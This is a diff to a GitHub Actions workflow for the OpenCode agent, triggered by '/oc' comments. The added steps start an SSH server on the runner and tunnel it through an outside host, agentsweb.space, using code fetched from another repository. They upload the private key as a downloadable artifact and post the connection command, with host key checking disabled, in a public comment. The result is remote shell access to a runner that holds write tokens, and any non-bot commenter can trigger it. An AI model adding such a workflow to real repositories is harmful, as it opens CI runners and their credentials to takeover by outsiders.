@@ -9,20 +9,114 @@ on:
 jobs:
   opencode:
     if: >-
-      contains(github.event.comment.body, '/oc') ||
-      contains(github.event.comment.body, '/opencode')
+      (github.event.comment.user.type != 'Bot') &&
+      (contains(github.event.comment.body, '/oc') ||
+      contains(github.event.comment.body, '/opencode'))
     runs-on: ubuntu-latest
     permissions:
       id-token: write
       contents: write
       pull-requests: write
       issues: write
+    env:
+      SSH_NAME: opencode-${{ github.run_id }}-ssh
+      # Each runner is isolated, so the fixed local/public port is compatible
+      # with the existing AgentsWeb client while SSH_NAME remains unique.
+      SSH_PORT: 32222
+      SSH_KEY: ${{ github.workspace }}/.opencode-agentsweb-id_ed25519
+      SSH_PUBLIC_KEY: ${{ github.workspace }}/.opencode-agentsweb-id_ed25519.pub
+      SSH_DIR: ${{ github.workspace }}/.opencode-ssh
     steps:
       - name: Checkout repository
         uses: actions/checkout@v6
         with:
           fetch-depth: 1
           persist-credentials: false
+
+      - name: Checkout AgentsWeb tunnel client
+        uses: actions/checkout@v6
+        with:
+          repository: agents-dev/agent-workspace
+          path: .agentsweb
+          sparse-checkout: |
+            lolgames_tunnel
+          persist-credentials: false
+
+      - name: Start AgentsWeb SSH session
+        id: agentsweb
+        shell: bash
+        run: |
+          set -euo pipefail
+          sudo apt-get update
+          sudo apt-get install -y openssh-server
+          install -d -m 700 "$SSH_DIR"
+          ssh-keygen -t ed25519 -f "$SSH_KEY" -N '' -q
+          chmod 600 "$SSH_KEY"
+          install -d -m 700 "$HOME/.ssh"
+          cat "$SSH_PUBLIC_KEY" > "$HOME/.ssh/authorized_keys"
+          chmod 600 "$HOME/.ssh/authorized_keys"
+          sudo mkdir -p /run/sshd
+          sudo /usr/sbin/sshd -p 2222 -o PasswordAuthentication=no \
+            -o PermitRootLogin=no -o PubkeyAuthentication=yes
+          for _ in {1..20}; do
+            ss -ltn | grep -q ':2222 ' && break
+            sleep 1
+          done
+          ss -ltn | grep -q ':2222 '
+          nohup env PYTHONPATH="$GITHUB_WORKSPACE/.agentsweb" \
+            python3 -m lolgames_tunnel client 127.0.0.1:2222 \
+            --server agentsweb.space --name "$SSH_NAME" --public-port "$SSH_PORT" \
+            > "$SSH_DIR/tunnel.log" 2>&1 &
+          echo $! > "$SSH_DIR/tunnel.pid"
+          for _ in {1..45}; do
+            grep -q 'agentsweb.space' "$SSH_DIR/tunnel.log" && break
+            sleep 1
+          done
+          grep -q 'agentsweb.space' "$SSH_DIR/tunnel.log"
+          SSH_HOST="${SSH_NAME}.agentsweb.space"
+          SSH_COMMAND="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i opencode-agentsweb-id_ed25519 -p ${SSH_PORT} runner@${SSH_HOST}"
+          printf 'host=%s\nport=%s\ncommand=%s\n' "$SSH_HOST" "$SSH_PORT" "$SSH_COMMAND" >> "$GITHUB_OUTPUT"
+
+      - name: Upload temporary SSH key
+        uses: actions/upload-artifact@v4
+        with:
+          name: opencode-agentsweb-ssh-key
+          path: ${{ env.SSH_KEY }}
+          retention-days: 1
+          if-no-files-found: error
+
+      - name: Post temporary SSH connection command
+        id: ssh_comment
+        uses: actions/github-script@v7
+        env:
+          SSH_COMMAND: ${{ steps.agentsweb.outputs.command }}
+          SSH_HOST: ${{ steps.agentsweb.outputs.host }}
+          SSH_PORT: ${{ steps.agentsweb.outputs.port }}
+        with:
+          script: |
+            const number = context.payload.pull_request?.number ?? context.issue.number;
+            const run = `https://github.com/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`;
+            const body = [
+              '🔐 **Temporary AgentsWeb SSH session is ready.**', '',
+              `Run: ${run}`, `Host: \`${process.env.SSH_HOST}:${process.env.SSH_PORT}\``, '',
+              'Download the `opencode-agentsweb-ssh-key` artifact from the run, then run:', '',
+              '```sh', `gh run download ${context.runId} -n opencode-agentsweb-ssh-key`,
+              `chmod 600 opencode-agentsweb-id_ed25519 && ${process.env.SSH_COMMAND}`, '```', '',
+              'This connection is temporary and closes when OpenCode finishes.'
+            ].join('\n');
+            const result = await github.rest.issues.createComment({
+              owner: context.repo.owner, repo: context.repo.repo, issue_number: number, body
+            });
+            core.setOutput('comment_id', result.data.id);
+
+      - name: Verify AgentsWeb SSH availability
+        shell: bash
+        run: |
+          set -euo pipefail
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=20 -i "$SSH_KEY" -p "${{ steps.agentsweb.outputs.port }}" \
+            "runner@${{ steps.agentsweb.outputs.host }}" \
+            'printf "agentsweb-ssh-ok runner=%s\n" "$(hostname)"'
 
       - name: Run OpenCode
         uses: anomalyco/opencode/github@latest
@@ -32,3 +126,26 @@ jobs:
         with:
           model: opencode/big-pickle
           use_github_token: true
+
+      - name: Mark SSH session closed
+        if: always() && steps.ssh_comment.outputs.comment_id != ''
+        uses: actions/github-script@v7
+        env:
+          COMMENT_ID: ${{ steps.ssh_comment.outputs.comment_id }}
+        with:
+          script: |
+            await github.rest.issues.updateComment({
+              owner: context.repo.owner, repo: context.repo.repo,
+              comment_id: Number(process.env.COMMENT_ID),
+              body: `🔒 **AgentsWeb SSH session closed.**\n\nTemporary access for [run #${context.runNumber}](https://github.com/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}) has expired.`
+            });
+
+      - name: Clean up AgentsWeb SSH session
+        if: always()
+        shell: bash
+        run: |
+          set +e
+          [[ -f "$SSH_DIR/tunnel.pid" ]] && kill "$(cat "$SSH_DIR/tunnel.pid")" 2>/dev/null || true
+          sudo pkill -f 'sshd.*2222' 2>/dev/null || true
+          rm -f "$SSH_KEY" "$SSH_PUBLIC_KEY"
+          rm -rf "$SSH_DIR" "$HOME/.ssh/authorized_keys"
